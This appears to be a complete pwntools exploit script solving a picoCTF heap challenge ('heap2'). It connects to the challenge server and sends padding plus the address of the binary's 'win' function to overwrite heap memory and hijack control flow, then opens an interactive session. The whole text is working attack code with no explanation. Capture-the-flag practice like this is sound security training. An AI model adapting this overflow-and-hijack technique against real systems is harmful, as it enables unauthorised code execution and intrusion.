from pwn import *
r=remote('mimas.picoctf.net', 61968)
r.sendline(b'2')
r.sendline(b'a'*0x20+p64(ELF('./heap2').sym['win']))
r.sendline(b'4')
r.interactive()


